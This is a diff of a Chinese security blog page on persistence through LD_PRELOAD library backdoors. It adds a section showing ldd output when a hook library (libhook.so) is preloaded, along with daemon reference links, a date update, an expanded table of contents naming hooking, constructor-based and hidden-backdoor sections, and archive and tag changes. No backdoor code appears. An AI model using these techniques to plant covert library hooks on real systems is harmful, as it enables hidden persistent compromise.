 <p>作者主要是遇到了<code>pwd</code>命令跟<code>whoami</code>命令都是动态编译，但是<code>whoami</code>可以动态链接成功，而<code>pwd</code>却没有任何共享库链接的问题，最后是通过编译pwd源码、readelf查看编译方式、LD_DEBUG查看共享库的使用情况，最后通过type -a确定了是pwd是bash集成的命令与系统中的whoami不同造成的链接恶意库失败。</p>
@@ -730,6 +797,9 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_DEBUG&#x3D;files &#x2F;bin&#x2F;whoami</span><br><span class="line">LD_DEBUG&#x3D;libs &#x2F;bin&#x2F;whoami</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220111100443610.png" alt="image-20220111100443610"></p>
+<h3 id="ldd查看依赖关系"><a href="#ldd查看依赖关系" class="headerlink" title="ldd查看依赖关系"></a>ldd查看依赖关系</h3><p>通过ldd可以查看依赖关系</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[linux@ t0]~$ldd ./a.out </span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffff7ffb000</span>)</span><br><span class="line">        libstdc++.so<span class="number">.6</span> =&gt; /lib64/libstdc++.so<span class="number">.6</span> (<span class="number">0x00007ffff7a3f000</span>)</span><br><span class="line">        libm.so<span class="number">.6</span> =&gt; /lib64/libm.so<span class="number">.6</span> (<span class="number">0x00007ffff76bd000</span>)</span><br><span class="line">        libgcc_s.so<span class="number">.1</span> =&gt; /lib64/libgcc_s.so<span class="number">.1</span> (<span class="number">0x00007ffff74a5000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007ffff70e3000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007ffff7dd4000</span>)</span><br><span class="line"></span><br><span class="line">[linux@ t0]~$LD_PRELOAD=./libhook.so ldd ./a.out </span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffff7ffb000</span>)</span><br><span class="line">        ./libhook.so (<span class="number">0x00007ffff7ff1000</span>)     &lt;----- 区别在这里</span><br><span class="line">        libstdc++.so<span class="number">.6</span> =&gt; /lib64/libstdc++.so<span class="number">.6</span> (<span class="number">0x00007ffff7a3f000</span>)</span><br><span class="line">        libm.so<span class="number">.6</span> =&gt; /lib64/libm.so<span class="number">.6</span> (<span class="number">0x00007ffff76bd000</span>)</span><br><span class="line">        libgcc_s.so<span class="number">.1</span> =&gt; /lib64/libgcc_s.so<span class="number">.1</span> (<span class="number">0x00007ffff74a5000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib64/libc.so<span class="number">.6</span> (<span class="number">0x00007ffff70e3000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007ffff7dd4000</span>)</span><br></pre></td></tr></table></figure>
+
 <h3 id="type-a查看命令来源"><a href="#type-a查看命令来源" class="headerlink" title="type -a查看命令来源"></a>type -a查看命令来源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type -a whoami</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220111100524504.png" alt="image-20220111100524504"></p>
@@ -738,6 +808,9 @@ height:50vh;
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/derkampf/article/details/69660050">https://blog.csdn.net/derkampf/article/details/69660050</a></li>
 <li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1835020">https://cloud.tencent.com/developer/article/1835020</a></li>
 <li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1835020">https://cloud.tencent.com/developer/article/1835020</a></li>
+<li><a target="_blank" rel="noopener" href="https://lloydrochester.com/post/c/unix-daemon-example/">unix daemon example</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xinyuan510214/article/details/50903280">daemon函数详解</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/str999_cn/article/details/78686923">用C语言在Linux系统下创建守护进程</a></li>
 </ul>
 
     </article>
@@ -747,7 +820,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2022/01/10/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8BLD-PRELOAD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%90%8E%E9%97%A8/">https://hackerqwq.github.io/2022/01/10/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8BLD-PRELOAD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%90%8E%E9%97%A8/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2022/01/10/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8BLD-PRELOAD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%90%8E%E9%97%A8/">January 10th 2022, 9:32:18 am</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2022/01/10/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8BLD-PRELOAD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%90%8E%E9%97%A8/">June 18th 2022, 9:00:11 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2022/01/10/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8BLD-PRELOAD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%90%8E%E9%97%A8/">September 15th 2022, 4:39:26 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -892,7 +965,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%90%8E%E9%97%A8%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">LD_PRELOAD后门简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ltrace"><span class="toc-number">2.1.</span> <span class="toc-text">ltrace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strace"><span class="toc-number">2.2.</span> <span class="toc-text">strace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gcc"><span class="toc-number">2.3.</span> <span class="toc-text">gcc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%BC%96%E8%AF%91%E5%92%8C%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91"><span class="toc-number">2.4.</span> <span class="toc-text">动态编译和静态编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%AE%9E%E9%AA%8C"><span class="toc-number">3.</span> <span class="toc-text">LD_PRELOAD实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">LD_PRELOAD实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8"><span class="toc-number">4.1.</span> <span class="toc-text">隐藏后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trick"><span class="toc-number">4.2.</span> <span class="toc-text">trick</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Issues"><span class="toc-number">5.</span> <span class="toc-text">Issues</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91Linux%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">从源代码编译Linux命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">查看编译方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-DEBUG"><span class="toc-number">5.3.</span> <span class="toc-text">LD_DEBUG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type-a%E6%9F%A5%E7%9C%8B%E5%91%BD%E4%BB%A4%E6%9D%A5%E6%BA%90"><span class="toc-number">5.4.</span> <span class="toc-text">type -a查看命令来源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%90%8E%E9%97%A8%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">LD_PRELOAD后门简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ltrace"><span class="toc-number">2.1.</span> <span class="toc-text">ltrace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strace"><span class="toc-number">2.2.</span> <span class="toc-text">strace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gcc"><span class="toc-number">2.3.</span> <span class="toc-text">gcc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%BC%96%E8%AF%91%E5%92%8C%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91"><span class="toc-number">2.4.</span> <span class="toc-text">动态编译和静态编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%AE%9E%E9%AA%8C"><span class="toc-number">3.</span> <span class="toc-text">LD_PRELOAD实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">LD_PRELOAD实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">直接修改函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0attribute%E8%B0%83%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">构造函数attribute调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E6%A1%A9%E5%BC%8F%E5%90%8E%E9%97%A8"><span class="toc-number">4.3.</span> <span class="toc-text">插桩式后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">4.4.</span> <span class="toc-text">拓展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8"><span class="toc-number">4.5.</span> <span class="toc-text">隐藏后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Issues"><span class="toc-number">5.</span> <span class="toc-text">Issues</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91Linux%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">从源代码编译Linux命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">查看编译方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-DEBUG"><span class="toc-number">5.3.</span> <span class="toc-text">LD_DEBUG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldd%E6%9F%A5%E7%9C%8B%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB"><span class="toc-number">5.4.</span> <span class="toc-text">ldd查看依赖关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type-a%E6%9F%A5%E7%9C%8B%E5%91%BD%E4%BB%A4%E6%9D%A5%E6%BA%90"><span class="toc-number">5.5.</span> <span class="toc-text">type -a查看命令来源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -3548,9 +3621,161 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 155
+        Total : 163
         </div>
         <!-- search  -->
         
@@ -3565,8 +3790,57 @@ top:50vh;
     
     
     
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/" >Despercate Cat 带来的Tomcat利用思路</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2022 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href= "/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/" >利用链神器-tabby使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2022/10/01/neo4j%E5%9B%BE%E5%BD%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0/" >neo4j图形数据库笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2022/09/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >PHP反序列化利用面总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2022/09/22/Webshell%E5%85%8D%E6%9D%80%E4%B9%8Bphp/" >Webshell免杀之php(WebShell免杀篇一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2022/09/21/source-map%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/" >source map源码泄露利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2022/09/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%88%A9%E7%94%A8%E9%9D%A2/" >中间件利用面</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2022/08/31/java%E5%9F%BA%E7%A1%80%E4%B9%8Bjndi/" >java基础之jndi</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4278,7 +4552,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露payload</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露</a>
         </li>
     
     
@@ -4374,8 +4648,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
@@ -4402,31 +4674,37 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
+    
         <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
+        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
         <span class="sidebar-tag-name" data-tags="权限提升"><span class="iconfont-archer">&#xe606;</span>权限提升</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
-    
-        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
-    
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="红蓝对抗"><span class="iconfont-archer">&#xe606;</span>红蓝对抗</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="2021Nep"><span class="iconfont-archer">&#xe606;</span>2021Nep</span>
     
@@ -4444,27 +4722,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
-    
-        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
-    
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
-        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
-    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="免杀"><span class="iconfont-archer">&#xe606;</span>免杀</span>
+    
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
@@ -4556,9 +4832,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
-    
         <span class="sidebar-tag-name" data-tags="url取反绕过"><span class="iconfont-archer">&#xe606;</span>url取反绕过</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
     
         <span class="sidebar-tag-name" data-tags="create_function注入"><span class="iconfont-archer">&#xe606;</span>create_function注入</span>
     
